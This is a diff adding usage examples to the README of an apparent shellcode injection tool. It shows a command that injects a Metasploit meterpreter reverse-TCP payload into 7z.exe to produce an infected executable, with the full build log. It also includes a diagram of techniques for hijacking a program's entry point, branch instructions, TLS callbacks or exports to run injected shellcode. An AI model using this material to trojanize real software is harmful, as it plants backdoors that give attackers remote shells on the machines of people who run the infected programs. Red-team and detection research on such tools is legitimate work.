@@ -39,6 +39,53 @@ Plugins:
   * APPEND
 
 
+## Examples
+
+### Metasploit in 7z
+
+Inject metasploit into 7z.exe. It will use PEB_WALK. 
+
+```
+PS C:\repos\supermega> python.exe .\supermega.py --shellcode .\shellcodes\msf-meterpreter-reversetcp.bin --inject .\exes\7z.exe
+(supermega.py) Super Mega
+(helper.py   ) --[ Remove old files ]
+(model.py    ) --( Capabilities: 
+(model.py    )   0x0: GetEnvironmentVariableW (b'')
+(model.py    )   0x460090: VirtualAlloc (b'')
+(supermega.py) --[ SourceStyle: peb_walk
+(compiler.py ) --[ C to ASM: build\main.c -> build\main.asm ]
+(compiler.py ) ---[ Make ASM from C: build\main.c ]
+(compiler.py ) ---[ Fixup  : build\main.asm ]
+(compiler.py )     > Replace external reference at line: 8
+(compiler.py )     > Replace external reference at line: 395
+(compiler.py )     > Replace payload length at line: 389
+(compiler.py )     > Add end of code label at line: 807
+(compiler.py ) ---[ Cleanup: build\main.asm ]
+(assembler.py) --[ Assemble to exe: build\main.asm -> build\main.exe -> build\main.bin ]
+(assembler.py) ---[ Assemble ASM to EXE: build\main.asm -> build\main.exe ]
+(assembler.py) ---[ EXE to SHC: build\main.exe -> build\main.bin ]
+(helper.py   ) --[ Code section: .text
+(helper.py   )     > 0x1000 Code Size: 2557  (raw code section size: 2560)
+(assembler.py) --[ Merge stager: build\main.bin + .\shellcodes\msf-meterpreter-reversetcp.bin -> build\main.bin ]
+(assembler.py) ---[ Size: Stager: 2557 and Payload: 449  Sum: 3006 ]
+(injector.py ) --[ Injecting: build\main.bin into: .\exes\7z.exe -> .\exes\7z.infected.exe ]
+(supermega.py) --[ Start infected exe ]
+```
+
+
+## rbmode
+```
+    save,run
+      |   |
+      |   +---------- 1 - change AddressOfEntryPoint
+      |               2 - hijack branching instruction at Original Entry Point (jmp, call, ...)
+      |               3 - setup TLS callback
+      |               4 - hijack branching instruction at DLL Exported function (use -e to specify export to hook)
+      |               
+      +-------------- 1 - store shellcode in the middle of a code section
+                      2 - append shellcode to the PE file in a new PE section
+```
+
 ## Directories
 
 * `shellcodes/`: Input: Shellcodes we want to use as input (payload)
